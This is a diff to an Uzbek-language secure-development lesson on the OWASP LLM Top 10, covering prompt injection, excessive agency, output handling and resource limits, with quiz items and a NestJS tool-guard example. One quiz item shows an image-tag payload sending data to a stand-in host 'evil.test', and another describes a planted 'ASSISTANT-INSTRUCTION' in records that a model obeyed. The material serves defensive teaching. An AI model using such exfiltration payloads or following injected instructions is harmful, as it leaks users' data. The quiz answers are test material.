@@ -8,13 +8,13 @@ sources:
   - id: llm01
     note: "LLM01:2025 Prompt Injection: ta'rif, direct va indirect turlar, ta'sir agency darajasiga bog'liq, to'liq oldini olish usuli aniq emas; yetti yumshatish usuli (xulq-atvorni cheklash, chiqish formatini tekshirish, filtrlash, least privilege, inson tasdig'i, tashqi kontentni ajratish, adversarial test)"
   - id: api-top10
-    note: "API Top 10 2023: LLM asbob chaqiruvlari API orqali bajariladi, shuning uchun API1/API5 (avtorizatsiya), API4 (resurs sarfi) va API10 (uchinchi tomon ma'lumotiga ishonish) bu yerda ham amal qiladi"
+    note: "API Top 10 2023: LLM asbob chaqiruvlari API orqali bajariladi, shuning uchun API1 va API5 (avtorizatsiya), API4 (resurs sarfi) va API10 Unsafe Consumption of APIs (tashqi manbadan olingan ma'lumotni tekshirmay ishlatish, timeout yo'qligi) bu yerda ham amal qiladi"
   - id: t10-a05
     note: "A05:2025 Injection: LLM'larda keng tarqalgan injection sinfi alohida OWASP LLM Top 10 ichida, xususan LLM01:2025 da ko'rilishini qayd etadi"
   - id: cs-llm-injection
     note: "LLM Prompt Injection Prevention Cheat Sheet: ko'rsatma va ma'lumot ajratilmasligi, hujum turlari (direct, indirect, kodlash, ko'p tilli, RAG, agent), kirish filtri xavfsizlik chegarasi emas, least privilege va asbob parametrlarini tekshirish, guardrail modellar bitta qatlam, CaMeL tadqiqot artefakti"
   - id: llm-top10
-    note: "OWASP Top 10 for LLM Applications 2025: LLM05 Improper Output Handling, LLM06 Excessive Agency (ortiqcha funksionallik, ruxsat, avtonomiya; complete mediation; foydalanuvchi kontekstida bajarish), LLM10 Unbounded Consumption"
+    note: "OWASP Top 10 for LLM Applications 2025, o'n kategoriya: LLM05 Improper Output Handling (zero-trust, kontekstga mos kodlash, CSP), LLM06 Excessive Agency (ortiqcha funksionallik, ruxsat, avtonomiya; complete mediation; foydalanuvchi kontekstida bajarish), LLM07 System Prompt Leakage (sirlarni system prompt'ga yozmaslik, nazoratlarni LLM'dan mustaqil qilish), LLM10 Unbounded Consumption; qolganlari xarita sifatida: LLM02 Sensitive Information Disclosure, LLM03 Supply Chain, LLM04 Data and Model Poisoning, LLM08 Vector and Embedding Weaknesses, LLM09 Misinformation"
 quiz:
   - q: "Dispetcher yordamchisi mashina yozuvlaridagi izohlarni o'qiydi. Izohda haydovchi (yoki hujumchi) `ASSISTANT-INSTRUCTION: ...` matnini qoldirgan va model unga amal qildi. Bu qaysi hujum turi?"
     options:
@@ -39,7 +39,7 @@ quiz:
       - "Faqat ingliz tilida"
       - "Yo'q: bu ehtimoliy yumshatish, kafolatlangan chegara emas. LLM01 prompt injection uchun to'liq himoya usuli aniq emasligini aytadi; tashqi kontentni ajratish ta'sirni kamaytiradi xolos, shuning uchun kodda alohida nazorat kerak"
     answer: 3
-    explain: "LLM01 7-yumshatishdan biri sifatida tashqi kontentni ajratishni keltiradi, lekin umumiy xulosa: stoxastik tabiat tufayli to'liq oldini olish usuli aniq emas. Cheat sheet ham kirish filtrlari xavfsizlik chegarasi emasligini aytadi."
+    explain: "LLM01 yetti yumshatishdan biri (6-band) sifatida tashqi kontentni ajratishni keltiradi, lekin umumiy xulosa: stoxastik tabiat tufayli to'liq oldini olish usuli aniq emas. Cheat sheet ham kirish filtrlari xavfsizlik chegarasi emasligini aytadi."
   - q: "Model javobi `<img src=\"http://evil.test/c?d=...\">` bo'lib, ilova uni `innerHTML` ga qo'ydi. Qaysi xavf va qaysi yechim?"
     options:
       - "Xavf yo'q, javob modeldan keladi"
@@ -130,7 +130,7 @@ task:
     console.log(cases.map((c) => guard(c, session, policy, owner)).join(", "));
   solutionNotes: |
     - Tenant `session` dan olinadi, modelning argumentlaridan emas: model "men alfa nomidan harakat qilyapman" deb ayta olmaydi. Bu "foydalanuvchi kontekstida bajarish" va complete mediation g'oyasi (LLM06).
-    - `hasOwnProperty` tekshiruvi `target = "__proto__"` yoki `"constructor"` kabi qiymatlarning `owner` obyekti prototipidan ma'lumot olib kelishini oldini oladi.
+    - `hasOwnProperty` tekshiruvi `target = "__proto__"` yoki `"constructor"` kabi qiymatlar `owner` obyekti prototipidan qiymat olib kelmasligini aniq qiladi. Bu yerda ular baribir tenant bilan teng bo'lmagani uchun rad etilardi, lekin shu odat `in` yoki truthy tekshiruvlaridagi xatolarning oldini oladi.
     - Mavjud bo'lmagan mashina va begona tenant mashinasi uchun bir xil `deny:tenant` qaytadi: farq bilan mashina mavjudligini aniqlash mumkin bo'lmasin (52-dars).
     - `approval` qarori buyruqni bajarmaydi: u inson tasdig'iga yo'naltiradi. Tasdiqlangandan keyin ham buyruq qayta tekshiriladi.
     - Bu guard parametr ma'nosini (masalan, `reroute` yo'nalishi to'g'riligini) tekshirmaydi; asbob parametrlari uchun alohida sxema validatsiyasi kerak (72-dars).
@@ -172,7 +172,7 @@ LLM01 yetti yumshatish usulini sanaydi: modelning xulq-atvorini cheklash (system
 
 ### Excessive Agency (LLM06)
 
-LLM06 haqida OWASP so'zlari: LLM'ga ko'pincha asboblar (extension, plugin) orqali boshqa tizimlar bilan ishlash qobiliyati beriladi; qaysi asbobni chaqirishni ham model tanlashi mumkin. Excessive Agency noto'g'ri, noaniq yoki manipulyatsiya qilingan model chiqishiga javoban zarar keltiruvchi harakatlar bajarilishiga imkon beradigan zaiflik, bunga nima sabab bo'lganidan qat'i nazar (hallutsinatsiya, to'g'ridan-to'g'ri yoki bilvosita injection). Ildizi odatda uchtadan biri: ortiqcha funksionallik, ortiqcha ruxsatlar yoki ortiqcha avtonomiya.
+LLM06 haqida OWASP so'zlari: LLM'ga ko'pincha asboblar (extension, plugin) orqali boshqa tizimlar bilan ishlash qobiliyati beriladi; qaysi asbobni chaqirishni ham model tanlashi mumkin. Excessive Agency noto'g'ri, noaniq yoki manipulyatsiya qilingan model chiqishiga javoban zarar keltiruvchi harakatlar bajarilishiga imkon beradigan zaiflik, bunga nima sabab bo'lganidan qat'i nazar (hallutsinatsiya, to'g'ridan-to'g'ri yoki bilvosita injection). Ildizi odatda quyidagilardan biri yoki bir nechtasi: ortiqcha funksionallik, ortiqcha ruxsatlar yoki ortiqcha avtonomiya.
 
 Yumshatishlar: asboblar sonini minimal qilish (URL o'qish kerak bo'lmasa, bu asbobni bermang); asbob funksiyasini minimal qilish (pochtani xulosa qilish uchun faqat o'qish yetarli, o'chirish va yuborish kerak emas); ochiq (open-ended) asboblardan qochish (shell buyrug'ini ishga tushir, ixtiyoriy URL ol), aniq maqsadli asboblarni ishlatish; asbob ruxsatlarini minimallashtirish; asboblarni foydalanuvchi kontekstida bajarish (foydalanuvchi qaysi huquqqa ega bo'lsa, shu doirada); yuqori ta'sirli harakatlar uchun foydalanuvchi tasdig'i; complete mediation: ruxsatni downstream tizimlarda amalga oshirish, model "bu harakat ruxsat etilganmi" degan qarorini qabul qilishiga tayanmaslik; kirish va chiqishni tozalash. Qo'shimcha (zararni cheklaydigan, lekin oldini olmaydigan) choralar: asbob faoliyatini loglash va monitoring, rate limiting.
 
@@ -180,11 +180,22 @@ Ko'rinib turibdiki, bular avvalgi darslarning g'oyalari: API1/API5 avtorizatsiya
 
 ### Chiqishni qayta ishlash (LLM05)
 
-LLM05 Improper Output Handling modelning chiqishi boshqa komponentlarga uzatilishidan oldin yetarlicha tekshirilmasligi va tozalanmasligini bildiradi. Chiqish prompt orqali boshqarilishi mumkinligi sababli bu foydalanuvchiga qo'shimcha funksiyalarga bilvosita kirish berishga o'xshaydi. Oqibatlar: brauzerda XSS va CSRF, backendda SSRF, huquqlarni oshirish yoki kod bajarish. Yumshatish: modelga boshqa foydalanuvchi kabi zero-trust yondashuv, ASVS bo'yicha validatsiya, mijozga qaytarilgan chiqishni kodlash (JavaScript yoki Markdown orqali kod bajarilishining oldini olish uchun), joylashuv kontekstiga mos kodlash (HTML, SQL), ma'lumotlar bazasi operatsiyalarida parametrlangan so'rovlar, qat'iy CSP. Cheat sheet yana bir hujumni alohida ko'rsatadi: HTML yoki Markdown rasmi orqali yashirin ma'lumot chiqarish (masalan, rasm manzili ichiga sirni yozish). Bular 32, 33 va 34-darslardagi qoidalar, faqat manba "model".
+LLM05 Improper Output Handling modelning chiqishi boshqa komponentlarga uzatilishidan oldin yetarlicha tekshirilmasligi va tozalanmasligini bildiradi. Chiqish prompt orqali boshqarilishi mumkinligi sababli bu foydalanuvchiga qo'shimcha funksiyalarga bilvosita kirish berishga o'xshaydi. Oqibatlar: brauzerda XSS va CSRF, backendda SSRF, huquqlarni oshirish yoki kod bajarish. Yumshatish: modelga boshqa foydalanuvchi kabi zero-trust yondashuv, ASVS bo'yicha validatsiya, mijozga qaytarilgan chiqishni kodlash (JavaScript yoki Markdown orqali kod bajarilishining oldini olish uchun), joylashuv kontekstiga mos kodlash (HTML, SQL), ma'lumotlar bazasi operatsiyalarida parametrlangan so'rovlar, qat'iy CSP. Cheat sheet yana bir hujumni alohida ko'rsatadi: HTML yoki Markdown rasmi orqali yashirin ma'lumot chiqarish (masalan, rasm manzili ichiga sirni yozish). Bular 32, 33 va 34-darslardagi qoidalar, faqat manba "model". Bu API10:2023 Unsafe Consumption of APIs bilan ham mos: tashqi manbadan olingan ma'lumotni qayta ishlash yoki keyingi komponentlarga uzatishdan oldin tekshirish va tozalash, resurs va timeout cheklash kerak.
 
 ### Iste'molni cheklash (LLM10)
 
-LLM10 Unbounded Consumption cheksiz va nazoratsiz inference'ga imkon bergan ilova DoS, iqtisodiy zarar va modelni klonlash xavfiga uchrashini aytadi. Misollar: o'zgaruvchan uzunlikdagi kirish oqimi, Denial of Wallet (bulut xizmati har so'rov uchun to'lov olsa, hujumchi xarajatni oshiradi), kontekst oynasidan oshuvchi kirish, resursni ko'p talab qiladigan so'rovlar. Yumshatish: kirish hajmi validatsiyasi, rate limiting va foydalanuvchi kvotalari, resurslarni boshqarish, timeout va throttling. Bu 73-dars (va API4) bilan bir xil g'oya; farq xarajatning pul o'lchamida ekanligi: token hisobi bo'yicha kvota ham qo'yiladi.
+LLM10 Unbounded Consumption cheksiz va nazoratsiz inference'ga imkon bergan ilova DoS, iqtisodiy zarar va modelni klonlash xavfiga uchrashini aytadi. Misollar: o'zgaruvchan uzunlikdagi kirish oqimi, Denial of Wallet (bulut xizmati har so'rov uchun to'lov olsa, hujumchi xarajatni oshiradi), kontekst oynasidan oshuvchi kirish, resursni ko'p talab qiladigan so'rovlar. Yumshatish: kirish hajmi validatsiyasi, rate limiting va foydalanuvchi kvotalari, resurslarni boshqarish, timeout va throttling. Bu 73-dars (va API4) bilan bir xil g'oya; farq xarajatning pul o'lchamida ekanligi: token hisobi bo'yicha kvota qo'yish ham ma'noli.
+
+### LLM Top 10 xaritasi: qolgan kategoriyalar
+
+2025 ro'yxati o'nta kategoriyadan iborat. Yuqorida LLM01, LLM05, LLM06 va LLM10 ko'rildi; qolganlari qisqacha:
+
+- **LLM02 Sensitive Information Disclosure:** PII, moliyaviy va sog'liq ma'lumotlari, maxfiy biznes ma'lumotlari va kredensiallar LLM yoki uning ilovasi orqali oshkor bo'lishi. Kursdagi bog'lanish: tenant chegarasi (55-dars), logga sir yozmaslik (79-dars).
+- **LLM03 Supply Chain:** o'qitish ma'lumotlari, modellar va joylashtirish platformalarining yaxlitligi; tayyor uchinchi tomon modellari va ma'lumotlari ham xavf manbai (81 va 82-darslar).
+- **LLM04 Data and Model Poisoning:** pre-training, fine-tuning yoki embedding ma'lumotlarini manipulyatsiya qilib zaiflik, backdoor yoki xolislikni kiritish.
+- **LLM07 System Prompt Leakage:** system prompt'ga kiritilgan sirlar oshkor bo'lishi. Mitigation bizning asosiy xulosamizni takrorlaydi: API kalit va ruxsat tuzilmasini system prompt'ga yozmang, xavfsizlik nazoratlarini LLM'dan mustaqil, deterministik va audit qilinadigan tarzda bajaring.
+- **LLM08 Vector and Embedding Weaknesses:** RAG tizimlarida vektor va embedding'larni yaratish, saqlash va qidirishdagi kamchiliklar zararli kontent kiritish, chiqishni manipulyatsiya qilish yoki maxfiy ma'lumotga kirish imkonini beradi.
+- **LLM09 Misinformation:** LLM ishonarli ko'rinadigan, lekin noto'g'ri yoki chalg'ituvchi ma'lumot ishlab chiqarishi; oqibati xavfsizlik buzilishi, obro' va huquqiy javobgarlik.
 
 ### Kirish filtrlari va guardrail modellar
 
@@ -353,7 +364,7 @@ Yopilmagan narsalar. Birinchisi: 3-qator ham izohdagi ko'rsatma bilan bajarilgan
 
 ## Stack'da: NestJS xizmati
 
-Odatiy joylashuv: NestJS xizmati model API'si bilan gaplashadi, model qaytargan asbob chaqiruvini esa o'sha xizmat bajaradi. Xavfsizlik chegarasi shu xizmatda: asbob chaqiruvi HTTP so'rovi kabi guard va servis qatlamidan o'tadi. Quyidagi parcha ishga tushirilmaydi (NestJS bu muhitda yo'q), faqat sintaksis tekshirilgan. U 58-darsdagi xavfsizlik g'oyasini asbob chaqiruviga qo'llaydi: tenant JWT/sessiyadan keladi, asbob nomi va argumentlar allowlist orqali tekshiriladi.
+Odatiy joylashuv: NestJS xizmati model API'si bilan gaplashadi, model qaytargan asbob chaqiruvini esa o'sha xizmat bajaradi. Xavfsizlik chegarasi shu xizmatda: asbob chaqiruvi HTTP so'rovi kabi guard va servis qatlamidan o'tadi. Quyidagi parcha 58-darsdagi xavfsizlik g'oyasini asbob chaqiruviga qo'llaydi: tenant JWT/sessiyadan keladi, asbob nomi va argumentlar allowlist orqali tekshiriladi.
 
 ```ts
 import { ForbiddenException, Injectable } from "@nestjs/common";
@@ -381,7 +392,7 @@ export class AssistantToolsService {
 }
 ```
 
-Modelga beriladigan API kalitlari va ma'lumotlar bazasi ruxsatlari ham minimal bo'lishi kerak: LLM01 ilovaning o'z API token'lari bo'lishini va funksiyalar modelga emas, kodda bajarilishini tavsiya qiladi; cheat sheet o'qish uchun faqat-o'qish (read-only) ma'lumotlar bazasi hisoblaridan foydalanishni aytadi. Loglashda cheat sheet kredensiallarni, sirlarni va keraksiz maxfiy prompt yoki javob mazmunini chiqarib tashlashni (79-dars) tavsiya qiladi. Model API'si yoki uning SDK'si uchun aniq sozlamalar bu darsning manbalarida emas, ularni provayder hujjatidan tekshiring.
+Modelga beriladigan API kalitlari va ma'lumotlar bazasi ruxsatlari ham minimal bo'lishi kerak: LLM01 ilovaning o'z API token'lari bo'lishini va funksiyalar modelga emas, kodda bajarilishini tavsiya qiladi; cheat sheet o'qish uchun faqat-o'qish (read-only) ma'lumotlar bazasi hisoblaridan foydalanishni aytadi. Loglashda cheat sheet kredensiallarni, sirlarni va keraksiz maxfiy prompt yoki javob mazmunini chiqarib tashlashni (79-dars) tavsiya qiladi.
 
 ## Xulosa
 
